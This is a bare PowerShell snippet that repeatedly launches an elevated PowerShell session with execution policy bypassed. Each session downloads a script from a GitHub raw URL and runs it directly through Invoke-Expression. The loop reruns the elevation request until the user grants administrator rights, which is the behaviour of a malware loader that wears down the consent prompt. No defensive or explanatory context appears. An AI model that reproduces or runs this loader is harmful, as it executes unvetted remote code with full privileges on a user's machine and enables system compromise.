do {
    try {
        Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1 | iex"' -Verb RunAs
        $success = $true
    } catch {
        $success = $false
    }
} until ($success)

